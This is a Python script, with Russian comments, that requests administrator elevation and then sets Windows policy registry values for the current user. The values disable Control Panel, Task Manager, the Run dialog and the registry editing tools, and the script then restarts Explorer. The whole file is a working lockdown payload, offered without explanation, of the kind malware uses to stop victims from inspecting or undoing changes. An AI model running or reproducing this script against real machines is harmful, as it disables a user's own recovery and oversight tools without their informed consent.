import winreg
import os
import subprocess
import ctypes
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def restart_explorer():
    subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], check=True, shell=True)
    subprocess.run(["start", "explorer.exe"], check=True, shell=True)

def block_all():
    pass
    # блокировка Control Panel
    set_registry_value(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", 1)

    # блокирока Task Manager
    set_registry_value(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1)

    # блокировка Run command
    set_registry_value(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", 1)


    # блокирока реестра
    set_registry_value(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 1)

    # Рестрарт Explorer
    restart_explorer()

def set_registry_value(key, subkey, name, value, value_type=winreg.REG_DWORD):
    try:
        reg_key = winreg.CreateKey(key, subkey)
        winreg.SetValueEx(reg_key, name, 0, value_type, value)
        winreg.CloseKey(reg_key)
    except WindowsError as e:
        print(f"Failed to set registry value. {e}")

def run_as_admin():
    if sys.version_info[0] == 3 and sys.version_info[1] >= 5:
        executable = sys.executable
        params = ' '.join([f'"{arg}"' for arg in sys.argv])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, params, None, 1)
    else:
        print("Python version must be 3.5 or higher to request admin privileges.")
        sys.exit(1)


if __name__ == "__main__":
    if not is_admin():
        run_as_admin()
    else:
        block_all()
